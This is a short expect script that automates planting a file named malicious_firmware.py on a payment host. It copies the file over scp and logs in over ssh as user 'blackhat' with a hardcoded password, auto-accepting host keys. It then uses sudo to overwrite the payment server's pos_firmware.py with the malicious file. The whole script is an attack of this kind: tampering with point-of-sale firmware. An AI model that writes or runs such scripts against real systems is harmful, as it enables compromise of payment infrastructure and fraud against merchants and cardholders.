#!/usr/bin/expect -f

spawn scp /home/ubuntu/malicious_firmware.py blackhat@payments.fazio.com:/home/blackhat/malicious_firmware.py

expect {
  "key fingerprint" {send "yes\r"; exp_continue}
  "password:" {send "blackhat\r"}
}

expect "100%"
wait 1
send "exit\r"

spawn ssh blackhat@payments.fazio.com

expect {
  "key fingerprint" {send "yes\r"; exp_continue}
  "password:" {send "blackhat\r"}
}

expect "$ "
send "sudo mv /home/blackhat/malicious_firmware.py /home/ubuntu/payment-server/pos_firmware.py"

expect "$ "
send "exit\r"